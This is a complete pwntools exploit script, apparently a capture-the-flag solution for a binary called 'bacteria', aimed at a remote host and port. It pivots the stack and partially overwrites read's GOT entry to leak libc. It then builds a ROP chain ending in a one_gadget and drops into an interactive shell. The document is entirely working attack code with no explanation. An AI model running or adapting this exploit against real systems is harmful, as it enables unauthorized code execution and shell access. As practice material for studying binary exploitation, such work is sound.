from pwn import *

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
elf = ELF('./bacteria')
# p = elf.process()
p = remote('34.81.158.137', 9487)

start = 0x401020
read = elf.sym['read']
read_got = elf.got['read']
leave_ret = 0x40103f
ret = 0x401040
rw_segment = 0x403000

def write(addr, value):
	sleep(0.1)
	p.send(p64(addr - 0x10) + p64(start + 4))

	payload = p64(rw_segment)
	payload += p64(start + 4)
	payload += value

	sleep(0.1)
	p.send(payload)


payload = p64(0x403100)
payload += p64(start + 4)
p.send(payload)

payload = p64(rw_segment)
payload += p64(start + 4)
sleep(0.1)
p.send(payload)

write(rw_segment + 0x50, p64(0) + p64(rw_segment + 0x10))
write(rw_segment + 0x40, p64(read) + p64(0))
write(rw_segment + 0x80, p64(0) + p64(rw_segment + 0x20))
write(rw_segment + 0x70, p64(read) + p64(0))

sleep(0.1)
p.send(p64(rw_segment) + p64(start + 4))

sleep(0.1)
p.send(b'c'*8 + p64(ret) + p64(read) + b'\x67')

sleep(0.1)
p.send(b'\xd0')

payload = p64(0)*2
payload += p64(rw_segment + 0x48)
payload += p64(0x100)
payload = payload.ljust(0x80, b'\x00')
payload += p64(read)
payload += p64(0)*2
payload += p64(read_got)
payload += p64(0x100)
payload += p64(0)
payload += p64(read)
payload += p64(0)*2
payload += p64(read_got)
payload += p64(0x100)
payload += p64(0)
payload += p64(leave_ret)

sleep(0.1)
p.send(payload)

sleep(0.1)
p.send(b'\x67')

sleep(0.1)
p.send(b'\x67')

libc.address = u64(p.recvuntil(b'\x7f').ljust(8, b'\x00')) - 55 - libc.sym['read']
print(hex(libc.address))

p.recv()

pop_rsi = libc.address + 0x27529
pop_rdx_r12 = libc.address + 0x11c371
one_gadget = libc.address + 0xe6c84

payload = p64(pop_rsi)
payload += p64(0)
payload += p64(pop_rdx_r12)
payload += p64(0)*2
payload += p64(one_gadget)

sleep(0.1)
p.sendline(payload)

p.interactive()
